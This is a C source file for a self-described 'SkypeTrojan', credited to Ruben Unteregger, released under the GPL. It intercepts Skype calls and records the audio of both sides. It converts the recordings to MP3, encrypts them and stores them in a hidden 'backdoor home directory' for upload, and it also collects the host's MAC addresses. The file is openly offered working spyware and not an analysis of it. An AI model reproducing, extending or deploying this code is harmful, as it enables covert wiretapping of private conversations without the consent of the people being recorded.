/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */






#include <windows.h>
#include <stdio.h>

#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <Lm.h>

#include <Shlwapi.h>
#include "VoIP_Recorder.h"
#include "BladeMP3EncDLL.h"
#include "crypto.h"


extern char gHomeDirectory[MAX_BUF_SIZE + 1];
extern char *gLIID;
extern char *gHiddenDirectory;
extern char *gQuality;


int gCurrentCallID = 0;
char *gEnvVariables[] = {"USERPROFILE", "TMP", "TEMP", "HOMEDRIVE", "windir", NULL};
extern char *gDLLName;
extern SYSTEMTIME gSystemTime;



extern BEINITSTREAM gBeInitStream;
extern BEENCODECHUNK gBeEncodeChunk;
extern BEDEINITSTREAM gBeDeinitStream;
extern BECLOSESTREAM gBeCloseStream;

extern HINSTANCE gLameDLL;




DWORD WINAPI writeOutputThread(LPVOID lpParam) 
{
  sAudioData *mAudioData = (sAudioData *) lpParam;
  DWORD dwWritten = 0;
  DWORD mMP3DataVolume = 0;
  char mOutTimeStamp[MAX_BUF_SIZE + 1];
  SYSTEMTIME mSystemTime;
  char mOutputDirectory[MAX_BUF_SIZE + 1];
  HANDLE mWaveOutFileHandle = INVALID_HANDLE_VALUE;
  FILE *mFH = NULL;
  char mTemp[MAX_BUF_SIZE + 1];
  int mRetVal = 0;
  PRECORD_BLOCK mDataBlock = NULL;



  /*
   * Find output directory
   *
   */

  ZeroMemory(mOutputDirectory, sizeof(mOutputDirectory));
  strncpy(mOutputDirectory, gHomeDirectory, sizeof(mOutputDirectory) - 1);



  if (strlen(mOutputDirectory) > 0)
  {
    if (mOutputDirectory[strlen(mOutputDirectory) - 1] != '\\')
      strcat(mOutputDirectory, "\\");

    strcat(mOutputDirectory, UPLOAD_DIRECTORY);

    if (!PathFileExists(mOutputDirectory))
      CreateDirectory(mOutputDirectory, NULL);

    if (PathFileExists(mOutputDirectory))
    {

      /*
       * Check if we're allowed to write further data to the disk
       *
       */

      ZeroMemory(mTemp, sizeof(mTemp));
      snprintf(mTemp, sizeof(mTemp) - 1, "%s\\%s", mOutputDirectory, FULL_FILE);

      if (! PathFileExists(mTemp))
      {

        /*
         * Create timestamp & output file
         *
         */

        ZeroMemory(mOutTimeStamp, sizeof(mOutTimeStamp));
        ZeroMemory(&mSystemTime, sizeof(mSystemTime));

        GetLocalTime(&mSystemTime);

        if (mAudioData->mPacketNumber == 0)
          snprintf(mOutTimeStamp, MAX_BUF_SIZE, "%04d-%02d-%02d-%02d-%02d-%02d", gSystemTime.wYear, gSystemTime.wMonth, gSystemTime.wDay, gSystemTime.wHour, gSystemTime.wMinute, gSystemTime.wSecond);
        else
          snprintf(mOutTimeStamp, MAX_BUF_SIZE, "%04d-%02d-%02d-%02d-%02d-%02d", mSystemTime.wYear, mSystemTime.wMonth, mSystemTime.wDay, mSystemTime.wHour, mSystemTime.wMinute, mSystemTime.wSecond);

        if (mOutputDirectory[strlen(mOutputDirectory) - 1] != '\\')
          strcat(mOutputDirectory, "\\"); 


        /*
         * Allocate new structure and assign audio data
         *
         */

        mDataBlock = (PRECORD_BLOCK) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RECORD_BLOCK));
        mDataBlock->wavdata = mAudioData->mAudioDataBuffer;
        mDataBlock->wavsize = mAudioData->mAudioDataSize;



        /*
         * The output filename in the header part of the output file
         *
         */

        ZeroMemory(mDataBlock->mHeaderData, sizeof(mDataBlock->mHeaderData));
        snprintf(mDataBlock->mHeaderData, sizeof(mDataBlock->mHeaderData) - 1, "%04d-%04d-SkypeOut-%s.mp3", gCurrentCallID, mAudioData->mPacketNumber, mOutTimeStamp);

        ZeroMemory(mDataBlock->mPseudoFileName, sizeof(mDataBlock->mPseudoFileName));
        snprintf(mDataBlock->mPseudoFileName, sizeof(mDataBlock->mPseudoFileName) - 1, "%sA%04d%04dO.bin", mOutputDirectory, gCurrentCallID, mAudioData->mPacketNumber);

        ZeroMemory(mDataBlock->mRealFileName, sizeof(mDataBlock->mRealFileName));
        snprintf(mDataBlock->mRealFileName, sizeof(mDataBlock->mRealFileName) - 1, "%04d-%04d-SkypeOut-%s.mp3", gCurrentCallID, mAudioData->mPacketNumber, mOutTimeStamp);


        mDataBlock->mp3data = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mAudioData->mAudioDataSize);
        mRetVal = convert2MP3(mDataBlock->wavdata, mDataBlock->wavsize, mDataBlock);


        if (mDataBlock->mp3data)
          HeapFree(GetProcessHeap(), 0, mDataBlock->mp3data);

        if (mDataBlock)
          HeapFree(GetProcessHeap(), 0, mDataBlock);

        if (mWaveOutFileHandle)
          CloseHandle(mWaveOutFileHandle);

      } // if (PathFileExists(mOutputDirectory))
    } // if (PathFileExists(mOutputDirectory))
  } // if (strlen(mOutputDirectory) > 0)

  if (mAudioData && mAudioData->mAudioDataBuffer)
  {
    HeapFree(GetProcessHeap(), 0, mAudioData->mAudioDataBuffer);
    mAudioData->mAudioDataBuffer = NULL;
  }


  if (mAudioData)
  {
    HeapFree(GetProcessHeap(), 0, mAudioData);
    mAudioData = NULL;
  }

  return(0);
}




/*
 *
 *
 */

DWORD WINAPI writeInputThread(LPVOID lpParam) 
{
  sAudioData *mAudioData = (sAudioData *) lpParam;
  DWORD dwWritten = 0;
  DWORD mMP3DataVolume = 0;
  char mInTimeStamp[MAX_BUF_SIZE + 1];
  SYSTEMTIME mSystemTime;
  HANDLE mWaveInFileHandle = INVALID_HANDLE_VALUE;
  char mOutputDirectory[MAX_BUF_SIZE + 1];
  char mTemp[MAX_BUF_SIZE + 1];
  FILE *mFH = NULL;
  int mRetVal = 0;
  PRECORD_BLOCK mDataBlock = NULL;



 /*
  * Find output directory
  *
  */

  ZeroMemory(mOutputDirectory, sizeof(mOutputDirectory));
  strncpy(mOutputDirectory, gHomeDirectory, sizeof(mOutputDirectory) - 1);


  if (strlen(mOutputDirectory) > 0)
  {
    if (mOutputDirectory[strlen(mOutputDirectory) - 1] != '\\')
      strcat(mOutputDirectory, "\\");

    strcat(mOutputDirectory, UPLOAD_DIRECTORY);

    if (!PathFileExists(mOutputDirectory))
      CreateDirectory(mOutputDirectory, NULL);


    if (PathFileExists(mOutputDirectory))
    {
      /*
       * Check if we're allowed to write further data to the disk
       *
       */

      ZeroMemory(mTemp, sizeof(mTemp));
      snprintf(mTemp, sizeof(mTemp) - 1, "%s\\%s", mOutputDirectory, FULL_FILE);

      if (! PathFileExists(mTemp))
      {
        /*
         * Create timestamp & output file
         *
         */

        ZeroMemory(mInTimeStamp, sizeof(mInTimeStamp));
        ZeroMemory(&mSystemTime, sizeof(mSystemTime));
        GetLocalTime(&mSystemTime);

        if (mAudioData->mPacketNumber == 0)
          snprintf(mInTimeStamp, MAX_BUF_SIZE, "%04d-%02d-%02d-%02d-%02d-%02d", gSystemTime.wYear, gSystemTime.wMonth, gSystemTime.wDay, gSystemTime.wHour, gSystemTime.wMinute, gSystemTime.wSecond);
        else
          snprintf(mInTimeStamp, MAX_BUF_SIZE, "%04d-%02d-%02d-%02d-%02d-%02d", mSystemTime.wYear, mSystemTime.wMonth, mSystemTime.wDay, mSystemTime.wHour, mSystemTime.wMinute, mSystemTime.wSecond);

        if (mOutputDirectory[strlen(mOutputDirectory) - 1] != '\\')
          strcat(mOutputDirectory, "\\"); 

        /*
         * Allocate new structure and assign audio data
         *
         */

        mDataBlock = (PRECORD_BLOCK) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RECORD_BLOCK));
        mDataBlock->wavdata = mAudioData->mAudioDataBuffer;
        mDataBlock->wavsize = mAudioData->mAudioDataSize;

        /*
         * The output filename in the header part of the output file.
         *
         */

        ZeroMemory(mDataBlock->mHeaderData, sizeof(mDataBlock->mHeaderData));
        snprintf(mDataBlock->mHeaderData, sizeof(mDataBlock->mHeaderData) - 1, "%04d-%04d-SkypeIn-%s.mp3", gCurrentCallID, mAudioData->mPacketNumber, mInTimeStamp);

        ZeroMemory(mDataBlock->mPseudoFileName, sizeof(mDataBlock->mPseudoFileName));
        snprintf(mDataBlock->mPseudoFileName, sizeof(mDataBlock->mPseudoFileName) - 1, "%sA%04d%04dI.bin", mOutputDirectory, gCurrentCallID, mAudioData->mPacketNumber);

        ZeroMemory(mDataBlock->mRealFileName, sizeof(mDataBlock->mRealFileName));
        snprintf(mDataBlock->mRealFileName, sizeof(mDataBlock->mRealFileName) - 1, "%04d-%04d-SkypeIn-%s.mp3", gCurrentCallID, mAudioData->mPacketNumber, mInTimeStamp);

        mDataBlock->mp3data = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mAudioData->mAudioDataSize);
        mRetVal = convert2MP3(mDataBlock->wavdata, mDataBlock->wavsize, mDataBlock);

        if (mDataBlock->mp3data)
          HeapFree(GetProcessHeap(), 0, mDataBlock->mp3data);

        if (mDataBlock)
          HeapFree(GetProcessHeap(), 0, mDataBlock);

        if (mWaveInFileHandle)
          CloseHandle(mWaveInFileHandle);

      } // if (! PathFileExists(mTemp))
    } // if (PathFileExists(mOutputDirectory)) 
  } //if (strlen(mOutputDirectory) > 0)



  if (mAudioData && mAudioData->mAudioDataBuffer)
  {
    HeapFree(GetProcessHeap(), 0, mAudioData->mAudioDataBuffer);
    mAudioData->mAudioDataBuffer = NULL;
  }


  if (mAudioData)
  {
    HeapFree(GetProcessHeap(), 0, mAudioData);
    mAudioData = NULL;
  }

  return(0);
}





/*
 * Find backdoor home directory 
 *
 */

char *findBDHomeDirectory (char *pDirectory, unsigned int pDirectorySize)
{
  int mCounter = 0;
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  FILE *mFH = NULL;

  ZeroMemory(pDirectory, pDirectorySize);

  for(mCounter = 0; gEnvVariables[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    if (GetEnvironmentVariable(gEnvVariables[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");          

      if (strlen(mTemp) + strlen(gHiddenDirectory) < pDirectorySize)
      {
        strcat(mTemp, gHiddenDirectory);

        if (mTemp[strlen(mTemp) - 1] != '\\')
          strcat(mTemp, "\\");

        if (PathFileExists(mTemp))
        {
          strncpy(pDirectory, mTemp, pDirectorySize);
          goto END;
        }
      }
    }    
  } 


  /*
   * No home directory found. create a new one
   *
   */

  for(mCounter = 0; gEnvVariables[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    if (GetEnvironmentVariable(gEnvVariables[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");      

      if (PathFileExists(mTemp))
      {
        ZeroMemory(mTemp2, sizeof(mTemp2));
        snprintf(mTemp2, sizeof(mTemp2) - 1, "%s%s", mTemp, gHiddenDirectory);
        CreateDirectory(mTemp2, NULL);
        if (PathFileExists(mTemp2))
        {
          strncpy(pDirectory, mTemp2, pDirectorySize);
          goto END;
        } // if (PathFileExists(mTemp))
      } // if (PathFileExists(mTemp))
    } // if (GetEnvironmentVariable(gEnvVariables[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
  } // for(mCounter = 0; gEnvVariables[mCounter] != NULL; mCounter++)

END:

  return(pDirectory);
}





/*
 * Set marker file, so other processes get informed about a specific state
 * we could use a mutex or a semaphore. this one is much simpler and consitency is not that important
 *
 */

int setRecordingMarker(char *pMarkerFile)
{
  char mOutputDirectory[1024];
  HANDLE mFileHandle;
  DWORD mBytesWritten = 0;

  ZeroMemory(mOutputDirectory, sizeof(mOutputDirectory));
  strncpy(mOutputDirectory, gHomeDirectory, sizeof(mOutputDirectory) - 1);


  if (mOutputDirectory[strlen(mOutputDirectory) - 1] != '\\')
    strcat(mOutputDirectory, "\\");

  strcat(mOutputDirectory, pMarkerFile);

  /*
   * Set the "recording" flag
   *
   */

  if ((mFileHandle = CreateFile(mOutputDirectory, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)) != INVALID_HANDLE_VALUE)
  {
    WriteFile(mFileHandle, mOutputDirectory, strlen(mOutputDirectory), &mBytesWritten, NULL);
    CloseHandle(mFileHandle);
  } // if ((mFileHandle = CreateFile(mOutputDirectory, GENERIC_WRITE...


  return(0);
}






/*
 * To keep integrity, delete all recording flags(if necessary)
 *
 */

void deleteAnyRecordingFlag(char *pMarkerFile, char *pReason)
{
  char mTemp[MAX_BUF_SIZE + 1];
  char mUploadDirFullPath[MAX_BUF_SIZE + 1];
  int mCounter = 0;


  for(mCounter = 0; gEnvVariables[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));

    if (GetEnvironmentVariable(gEnvVariables[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");
      
      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s%s\\%s", mTemp, gHiddenDirectory, pMarkerFile);

      if (PathFileExists(mUploadDirFullPath))
        DeleteFile(mUploadDirFullPath);
    } // if (GetEnvironmentVariable(gEnvVariables[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
  } // for(mCounter = 0; gEnvVariables[mCounter] != NULL; mCounter++)
}





/*
 * Get call id
 *
 */

int getCurrentCallID()
{
  int mCallID = 0;
  time_t lTime;

  time(&lTime);

  if (lTime > 0)
    mCallID = lTime;

  return(mCallID);
}



/*
 *
 *
 */

int voiceDataAvailable(char *pVoiceDirectory, char *pPattern)
{
  WIN32_FIND_DATA FindFileData;
  HANDLE hFind = INVALID_HANDLE_VALUE;
  char mDirSpec[MAX_BUF_SIZE + 1];
  char mFilePath[MAX_BUF_SIZE + 1];
  DWORD dwError;
  struct stat mFileStatus;
  
  
  if (pVoiceDirectory[strlen(pVoiceDirectory) - 1] != '\\')
    strcat(pVoiceDirectory, "\\");    

  ZeroMemory(mDirSpec, sizeof(mDirSpec));
  snprintf(mDirSpec, sizeof(mDirSpec) - 1, "%s%s", pVoiceDirectory, pPattern);


  if ((hFind = FindFirstFile(mDirSpec, &FindFileData)) == INVALID_HANDLE_VALUE) 
  {
    return (-1);
  } else {
    ZeroMemory(mFilePath, sizeof(mFilePath));    
    ZeroMemory(&mFileStatus, sizeof(struct stat));
    snprintf(mFilePath, sizeof(mFilePath) - 1, "%s%s", pVoiceDirectory, FindFileData.cFileName);
    
    stat(mFilePath, &mFileStatus); 
      
    if (mFileStatus.st_size > 0)
    {
      FindClose(hFind);  
      return(0);
    }    

    while (FindNextFile(hFind, &FindFileData) != 0) 
    {
      ZeroMemory(mFilePath, sizeof(mFilePath));    
      ZeroMemory(&mFileStatus, sizeof(struct stat));
      snprintf(mFilePath, sizeof(mFilePath) - 1, "%s%s", pVoiceDirectory, FindFileData.cFileName);
      _stat(mFilePath, &mFileStatus);
      
      if (mFileStatus.st_size > 0)
      {
        FindClose(hFind);          
        return(0);      
      } // if (mFileStatus.st_size > 0)
    } // while (FindNextFile(hFind, &FindFileData) != 0)
    
    dwError = GetLastError();
    FindClose(hFind);
    if (dwError != ERROR_NO_MORE_FILES) 
      return (-1);
  } // if ((hFind = FindFirstFile(mDirSpec, &FindFileData)) == INVALID_HANDLE_VALUE) 
  
  return(1);
}    




/*
 *
 * 
 */
    
int getMACAddress(char *pMACAddresses, unsigned int pMACAddressesSize)
{
  LANA_ENUM mAdapterList;
  NCB mNcb;
  NCB mNcb2;
  char mMAC[64];
  int i;
  ASTAT Adapter;    
  int mRetVal = 0;


  ZeroMemory(&mNcb, sizeof(NCB));
  mNcb.ncb_command = NCBENUM;
  mNcb.ncb_buffer = (unsigned char *) &mAdapterList;
  mNcb.ncb_length = sizeof(mAdapterList);
  Netbios(&mNcb);

  /*
   * Get all of the local ethernet addresses
   *
   */


  for (i = 0; i < mAdapterList.length; ++i) 
  {
    ZeroMemory(&mNcb2, sizeof(mNcb2));
    mNcb2.ncb_command = NCBRESET;
    mNcb2.ncb_lana_num = mAdapterList.lana[i];

    if (Netbios(&mNcb2) != NRC_GOODRET) 
    {
      mRetVal = 1;
      goto END;
    }

    /*
     * Prepare to get the adapter status block 
     *
     */

    ZeroMemory(&mNcb2, sizeof(mNcb2));
    mNcb2.ncb_command = NCBASTAT;
    mNcb2.ncb_lana_num = mAdapterList.lana[i];
    strcpy((char *) mNcb2.ncb_callname, "*");

    ZeroMemory(&Adapter, sizeof(Adapter));
    mNcb2.ncb_buffer = (unsigned char *)&Adapter;
    mNcb2.ncb_length = sizeof(Adapter);


    /*
     * Get the adapter's info and, if this works, return it in standard, colon-delimited form.
     *
     */

    if (Netbios(&mNcb2) == 0) 
    {
      snprintf(mMAC, sizeof(mMAC) - 1, "%02X:%02X:%02X:%02X:%02X:%02X ",
      (Adapter.adapt.adapter_address[0]),
      (Adapter.adapt.adapter_address[1]),
      (Adapter.adapt.adapter_address[2]),
      (Adapter.adapt.adapter_address[3]),
      (Adapter.adapt.adapter_address[4]),
      (Adapter.adapt.adapter_address[5]));
       
      if ((strlen(pMACAddresses) + strlen(mMAC)) < pMACAddressesSize)
      {
        strncat(pMACAddresses, mMAC, 18);
      } else {
        break;
      } // if ((strlen(pMACAddresses) + strlen(mMAC)) <  pMACAddressesSize)
    } else {
      return(1);
    } // if (Netbios(&mNcb2) == 0)
  } // for (i = 0; i < mAdapterList.length; ++i) 
      
END:
    return(mRetVal);
} 






/*
 *
 *
 */
int convert2MP3(SHORT *pWAVBuffer, int pBufferSize, PRECORD_BLOCK pDataBlock)
{
  BE_CONFIG	beConfig		= {0,};
  DWORD		dwSamples		= 0;
  DWORD		dwMP3Buffer		= 0;
  HBE_STREAM	hbeStream		= 0;
  BE_ERR		err				= 0;
  PBYTE		pMP3Buffer		= NULL;
  PBYTE mMP3Data = NULL;

  int mMP3DataSize = 0;
  int mDataOffset = sizeof(pDataBlock->mHeaderData);

  DWORD dwRead=0;
  DWORD dwWrite=0;
  DWORD dwWritten = 0;
  int mWriteData2FileRetVal = 0;
  int mWAVIndex = 0;
  int mMP3Index = 0;
  SHORT *pIndexPointer = 0;
  int mQuality = 0;
  char *mEncodedAndEncrypted = NULL;
  int mOutputLength = 0;
  int mRetVal = 0;
  FILE *mFH = NULL;
  char mTemp[MAX_BUF_SIZE + 1];
  char mCurrentDirectory[MAX_BUF_SIZE + 1];
  char mTempHeaderData[MAX_BUF_SIZE];
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  ZeroMemory(&beConfig, sizeof(beConfig));
  beConfig.dwConfig = BE_CONFIG_LAME;


  if (gQuality[0] == '8')
    mQuality = 8;
  else
    mQuality = 16;


  /*
   * Load lame_enc.dll library (Make sure though that you set the 
   * project/settings/debug Working Directory correctly, otherwhise the DLL can't be loaded
   */

  ZeroMemory(mCurrentDirectory, sizeof(mCurrentDirectory));
  if (GetCurrentDirectory(sizeof(mCurrentDirectory) - 1, mCurrentDirectory))
    SetCurrentDirectory(gHomeDirectory);

  ZeroMemory(mTemp, sizeof(mTemp));
  strncpy(mTemp, gHomeDirectory, sizeof(mTemp) - 1);

  if (mTemp[strlen(mTemp) - 1] != '\\' )
    strcat(mTemp, "\\");

  strncat(mTemp, gDLLName, sizeof(mTemp) - 1);


  if(gLameDLL == NULL)
  {
    if ((gLameDLL = LoadLibrary(mTemp)) == NULL)
    {
      mRetVal  = -1;
      goto END;
    }
  } // if(gLameDLL == NULL)


  /*
   * Get Interface functions if necessary.
   *
   */

  if (gBeInitStream == NULL)
    gBeInitStream = (BEINITSTREAM) GetProcAddress(gLameDLL, TEXT_BEINITSTREAM);

  if (gBeEncodeChunk == NULL)
    gBeEncodeChunk = (BEENCODECHUNK) GetProcAddress(gLameDLL, TEXT_BEENCODECHUNK);

  if (gBeDeinitStream == NULL)
    gBeDeinitStream = (BEDEINITSTREAM) GetProcAddress(gLameDLL, TEXT_BEDEINITSTREAM);

  if (gBeCloseStream == NULL)
    gBeCloseStream = (BECLOSESTREAM) GetProcAddress(gLameDLL, TEXT_BECLOSESTREAM);


  /*
   * Check if all interfaces are present
   *
   */

  if(!gBeInitStream || !gBeEncodeChunk || !gBeDeinitStream || !gBeCloseStream)
  {
    mRetVal = 1;
    goto END;
  }



  /*
   * Initialize structure values.
   *
   */

  ZeroMemory(&beConfig, sizeof(beConfig)); // clear all fields

  beConfig.dwConfig					= BE_CONFIG_LAME;
  beConfig.format.LHV1.dwStructVersion			= 1;
  beConfig.format.LHV1.dwStructSize			= sizeof(beConfig);		
  beConfig.format.LHV1.dwSampleRate			= 48000;
  beConfig.format.LHV1.dwReSampleRate			= 0; 
  beConfig.format.LHV1.nMode				= BE_MP3_MODE_MONO;
  beConfig.format.LHV1.dwBitrate			= mQuality;
  //beConfig.format.LHV1.nPreset			= LQP_LOW_QUALITY;
  beConfig.format.LHV1.dwMpegVersion			= MPEG1;			
  beConfig.format.LHV1.dwPsyModel			= 0;				
  beConfig.format.LHV1.dwEmphasis			= 0;
  beConfig.format.LHV1.bOriginal			= TRUE;
  beConfig.format.LHV1.bNoRes				= TRUE;	
  beConfig.format.LHV1.bWriteVBRHeader			= TRUE;	
  beConfig.format.LHV1.bCRC				= FALSE;
  beConfig.format.LHV1.bPrivate				= FALSE;
  beConfig.format.LHV1.bEnableVBR			= FALSE;



  /*
   * Init the MP3 Stream
   *
   */

  if(gBeInitStream(&beConfig, &dwSamples, &dwMP3Buffer, &hbeStream) != BE_ERR_SUCCESSFUL)
  {
    mRetVal = 2;
    goto END;
  }


  if(!(pMP3Buffer = (BYTE *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(BYTE) * dwMP3Buffer)))
  {
    mRetVal = -2;
    goto END;
  }




  /*
   * Encode that shit
   *
   */

  if((gBeEncodeChunk(hbeStream, pBufferSize/2, pWAVBuffer, pDataBlock->mp3data, &pDataBlock->mp3datasize)) != BE_ERR_SUCCESSFUL)
  {
    gBeCloseStream(hbeStream);
    mRetVal = 3;
    goto END;
  }


  if (pDataBlock->mp3datasize > 0)
  {
    if(!(mMP3Data = (BYTE *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(BYTE) * pDataBlock->mp3datasize + sizeof(pDataBlock->mHeaderData))))
    {
      mRetVal = -2;
	      goto END;
    }

    memcpy(&mMP3Data[mDataOffset], pDataBlock->mp3data, pDataBlock->mp3datasize);
    mMP3DataSize += pDataBlock->mp3datasize;
    mDataOffset += pDataBlock->mp3datasize;
  } // if (pDataBlock->mp3datasize > 0)





  /*
   * Deinit the stream. if there's still audio data in the buffer, process it
   *
   */

  if((gBeDeinitStream(hbeStream, pMP3Buffer, &dwWrite)) != BE_ERR_SUCCESSFUL)
  {
    gBeCloseStream(hbeStream);
    mRetVal = -3;
    goto END;
  } // if((gBeDeinitStream(hbeStream, pMP3Buffer, &dwWrite)) != BE_ERR_SUCCESSFUL)


  if (dwWrite > 0)
  {
    if(!(mMP3Data = (BYTE *) HeapReAlloc(GetProcessHeap(), 0, mMP3Data, mMP3DataSize + dwWrite)))
    {
      mRetVal = -2;
      goto END;
    } // if(!(mMP3Data = (BYTE *) HeapReAlloc(GetProcessHeap(), 0, mMP3Data, mMP3DataSize + dwWrite)))

    memcpy(&mMP3Data[mDataOffset], pMP3Buffer, dwWrite);
    mMP3DataSize += dwWrite;
    mDataOffset += dwWrite;
  } // if (dwWrite > 0)



  /* 
   * Write header data.
   *
   */

  ZeroMemory(mTempHeaderData, sizeof(mTempHeaderData));
  snprintf(mTempHeaderData, sizeof(mTempHeaderData) - 1, "%s,%s,%d", VR_BANNER, pDataBlock->mHeaderData, mMP3DataSize);
  ZeroMemory(pDataBlock->mHeaderData, sizeof(pDataBlock->mHeaderData));
  memcpy(mMP3Data, mTempHeaderData, sizeof(pDataBlock->mHeaderData));


  /*
   * Encrypt header + audio data
   *
   */

  mEncodedAndEncrypted = encryptAndEncode(mDataOffset, (char *) mMP3Data, &mOutputLength, gLIID);

  if (mOutputLength > 0)
    mWriteData2FileRetVal = writeDataToFile(pDataBlock->mPseudoFileName, mEncodedAndEncrypted, mOutputLength);


  if (mEncodedAndEncrypted != NULL)
  {
    HeapFree(GetProcessHeap(), 0, mEncodedAndEncrypted);
    mEncodedAndEncrypted = NULL;
  }


  // close the MP3 Stream
  gBeCloseStream(hbeStream);


END:


  // Release allocated resources.

  if (pMP3Buffer != NULL)
    HeapFree(GetProcessHeap(), 0, pMP3Buffer);

  if (mCurrentDirectory[0])
    SetCurrentDirectory(mCurrentDirectory);


  if (mMP3Data != NULL)
  {
    HeapFree(GetProcessHeap(), 0, mMP3Data);
    mMP3Data = NULL;
  }

  return(0);
}



/*
 * Write b64 encoded data in a structured manner to a file.
 *
 */

int writeDataToFile(char *pOutputFile, char *pEncodedAndEncrypted, int pOutputLength)
{
  int mRetVal = 0;
  int mCounter = 0;
  int mCounter2 = 0;
  DWORD dwWritten = 0;
  HANDLE mOutputFileHandle = INVALID_HANDLE_VALUE;
  char mTempFileName[MAX_BUF_SIZE + 1];
  char mUnencryptedFileName[MAX_BUF_SIZE + 1];
  char mEncryptedFileName[MAX_BUF_SIZE + 1];



  /*
   * Crate a temporary filename to which we can write into.
   *
   */

  ZeroMemory(mTempFileName, sizeof(mTempFileName));
  ZeroMemory(mUnencryptedFileName, sizeof(mUnencryptedFileName));
  ZeroMemory(mEncryptedFileName, sizeof(mEncryptedFileName));


  if (CRYPTO_ON)
  {
    strncpy(mTempFileName, pOutputFile, sizeof(mTempFileName) - 1);
    strncpy(mEncryptedFileName, pOutputFile, sizeof(mEncryptedFileName) - 1);
  } else {
    strncpy(mUnencryptedFileName, pOutputFile, sizeof(mUnencryptedFileName) - 1);
    memset(&mUnencryptedFileName[strlen(mUnencryptedFileName) - 4], 0, 4);
    strcat(mUnencryptedFileName, "0");
    snprintf(mTempFileName, sizeof(mTempFileName) - 1, "%s.bin", mUnencryptedFileName);
    strncpy(mUnencryptedFileName, mTempFileName, sizeof(mUnencryptedFileName) - 1);
  } // if (CRYPTO_ON)

  memcpy(&mTempFileName[strlen(mTempFileName) - 3], VR_WORKING_EXTENSION, 3);


  if ((mOutputFileHandle = CreateFile(mTempFileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)) == INVALID_HANDLE_VALUE)
  {
    mRetVal = -1;
    goto END;
  }


  for (mCounter = 0, mCounter2 = 0; mCounter < pOutputLength; mCounter++)
  {
    WriteFile(mOutputFileHandle, &pEncodedAndEncrypted[mCounter], 1, &dwWritten, NULL);
    if (++mCounter2 == LINE_LENGTH)
    {
      WriteFile(mOutputFileHandle, "|", 1, &dwWritten, NULL);
      mCounter2 = 0;
    } // if (++mCounter2 == LINE_LENGTH / ENCODED_CHUNK_SIZE)
  } // for (mCounter = 0; mCounter < pOutputLength; mCounter++)


END:

  if (mOutputFileHandle != INVALID_HANDLE_VALUE)
  {
    CloseHandle(mOutputFileHandle);

    if (CRYPTO_ON)
      MoveFile(mTempFileName, mEncryptedFileName);
    else
      MoveFile(mTempFileName, mUnencryptedFileName);
  } // if (mOutputFileHandle != INVALID_HANDLE_VALUE)


  return(mRetVal);
}